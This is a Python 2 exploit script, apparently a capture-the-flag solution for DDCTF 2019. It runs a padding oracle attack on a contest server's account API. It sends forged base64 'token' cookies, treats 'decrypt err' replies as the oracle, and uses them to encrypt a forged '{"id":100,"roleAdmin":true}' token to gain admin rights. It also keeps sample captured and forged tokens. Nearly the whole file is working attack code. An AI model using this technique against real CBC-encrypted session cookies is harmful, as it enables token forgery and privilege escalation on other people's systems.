# -*- coding: utf-8 -*-
from paddingoracle import BadPaddingException, PaddingOracle
from base64 import b64encode, b64decode
from urllib import quote, unquote
import requests
import socket
import time


class PadBuster(PaddingOracle):
    def __init__(self, **kwargs):
        super(PadBuster, self).__init__(**kwargs)
        self.session = requests.Session()
        self.wait = kwargs.get('wait', 2.0)

    def oracle(self, data, **kwargs):
        token = b64encode(data)
        print token
        cookies = {"token": token}
        while 1:
            try:
                response = self.session.get('http://c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023/api/account_info', cookies=cookies,
                                            stream=False, timeout=5, verify=False)
                break
            except (socket.error, requests.exceptions.RequestException):
                logging.exception('Retrying request in %.2f seconds...',
                                  self.wait)
                time.sleep(self.wait)
                continue

        self.history.append(response)

        if "decrypt err" not in response.text:
            logging.debug('No padding exception raised on %r', token)
            return

        raise BadPaddingException


if __name__ == '__main__':
    import logging

    logging.basicConfig(level=logging.ERROR)

    #token = "UGFkT3JhY2xlOml2L2NiY45G534jPssPhdAMt/S8cpZxXiUnLRS2n2JtYNgWLvNSGHGw5dv3g/bUmOIWE7teXQ=="
    token = "UGFkT3JhY2xlOml2L2NiY8O+7uQmXKFqNVUuI9c7VBe42FqRvernmQhsxyPnvxaF"
    encrypted_token = b64decode(token)

    padbuster = PadBuster()

    start = time.time()
    '''
    plaintext_padding = padbuster.decrypt(encrypted_token, block_size=16, iv=bytearray(16))
    print('Decrypted some token: %s => %r' % (token, plaintext_padding))
    '''
    admin_plaintext_padding = '{"id":100,"roleAdmin":true}'
    encrypted_padding = padbuster.encrypt(admin_plaintext_padding, block_size=16, iv=bytearray(16))
    print b64encode(encrypted_padding)
    #1YNVAISdtjgYC3t4XJPkl6HhLeroubt01XrDUGcj2O8AAAAAAAAAAAAAAAAAAAAA
    #FccWKp1tLJfPUl3sx38ZiFkMXtwaXnBm0Fpxev4W6h6o5Sqm8Pe9c8ViuFNkINvsAAAAAAAAAAAAAAAAAAAAAA==
    elapsed = (time.time() - start)
    print elapsed  # 5 minute